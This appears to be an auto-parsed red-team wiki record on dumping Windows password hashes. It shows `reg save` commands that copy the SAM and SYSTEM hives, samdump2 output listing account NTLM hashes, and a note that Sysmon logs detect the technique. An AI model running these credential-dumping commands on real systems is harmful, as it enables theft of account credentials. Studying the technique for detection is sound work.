---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Dumping Hashes from SAM

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-credential-access-and-credential-dumping-dumping-hashes-from-sam` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Dumping the registry hives required for hash extraction:

## Preserved Body

````markdown
## Execution

Dumping the registry hives required for hash extraction:
```erlang
reg save hklm\system system
reg save hklm\sam sam
```
Once the files are dumped and exfiltrated, we can dump hashes with samdump2 on kali:
```erlang
root@~/tools/mitre/pwdump# samdump2 system sam 
*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:9f288c9a9aee917e19d4b21928b98268:::
low:1003:aad3b435b51404eeaad3b435b51404ee:4bdaf9484819a077562ebeefaed6ca75:::
```
## Observations

Sysmon logs with commandlines will reveal credential dump attempts from the registry as expected:

![](<../../_assets/pwdump-reg-sysmon.png>)
````

## Source Verification

[source record](../../sources/redteamingtactics/dumping-hashes-from-sam.md)

## Evidence Excerpt

````text
_asset_filenames:
- pwdump-reg-sysmon.png
_body: "---\ndescription: >-\n  Security Accounts Manager (SAM) credential dumping with living off the land\n  binary.\n---\n\
\n# Dumping Hashes from SAM\n\n## Execution\n\nDumping the registry hives required for hash extraction:\n\n{% code title=\"\
attacker@victim\" %}\n```erlang\nreg save hklm\\system system\nreg save hklm\\sam sam\n```\n{% endcode %}\n\nOnce the files\
\ are dumped and exfiltrated, we can dump hashes with samdump2 on kali:\n\n{% code title=\"attacker@local\" %}\n```erlang\n\
root@~/tools/mitre/pwdump# samdump2 system sam \n*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nHomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:9f288c9a9aee917e19d4b21928b98268:::\n\
````
